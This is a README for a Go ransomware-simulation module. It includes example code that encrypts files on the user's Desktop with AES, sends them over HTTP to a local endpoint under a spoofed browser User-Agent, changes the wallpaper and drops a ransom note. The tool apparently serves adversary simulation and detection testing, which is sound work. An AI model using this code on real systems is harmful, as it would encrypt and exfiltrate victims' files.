# Ransimware

<a href="https://www.buymeacoffee.com/mjwhitta">🍪 Buy me a cookie</a>

[![Go Report Card](https://goreportcard.com/badge/gitlab.com/mjwhitta/ransimware)](https://goreportcard.com/report/gitlab.com/mjwhitta/ransimware)

## What is this?

This Go module allows you to simulate ransomware.

## How to install

Open a terminal and run the following:

```
$ go get -u gitlab.com/mjwhitta/ransimware
```

## Usage

Minimal example:

```
package main

import (
    "os"
    "path/filepath"

    rw "gitlab.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Try to get home directory
    if home, e = os.UserHomeDir(); e != nil {
        panic(e)
    }

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Since no encrypt function is defined, the default behavior is
    // to do nothing

    // Since no exfil function is defined, the default behavior is to
    // do nothing

    // Since no notify function is defined, the default behavior is to
    // do nothing

    // Target the user's Desktop folder
    if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
        panic(e)
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

More complex example:

```
package main

import (
    "os"
    "path/filepath"
    "strings"

    rw "gitlab.com/mjwhitta/ransimware"
)

func main() {
    var e error
    var home string
    var sim *rw.Simulator

    // Try to get home directory
    if home, e = os.UserHomeDir(); e != nil {
        panic(e)
    }

    // Create simulator with 32 worker threads
    sim = rw.New(32)

    // Set encryption method to AES using provided helper function
    sim.Encrypt = rw.AESEncrypt("password")

    // Set exfil method to be HTTP using provided helper function
    sim.Exfil = rw.HTTPExfil(
        "http://localhost:8080",
        map[string]string{
            "User-Agent": strings.Join(
                []string{
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "AppleWebKit/537.36 (KHTML, like Gecko)",
                    "Chrome/84.0.4147.105 Safari/537.36",
                },
                " ",
            ),
        },
    )

    // Notify user by changing wallpaper and leaving a ransom note,
    // using the provided helper functions
    sim.Notify = func() error {
        rw.WallpaperNotify(
            "C:\\Windows\\Temp\\ransom.png",
            rw.DefaultPNG,
        )()

        rw.RansomNote(
            filepath.Join(home, "Desktop", "ransomnote.txt"),
            []string{"This is a ransomware simulation."},
        )()

        return nil
    }

    // Target the user's Desktop folder
    if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
        panic(e)
    }

    // Run the simulator
    if e = sim.Run(); e != nil {
        panic(e)
    }
}
```

## Links

- [Source](https://gitlab.com/mjwhitta/ransimware)

## TODO

- Provide more helper functions
    - DNS exfil
    - FTP exfil
    - RSA encryption
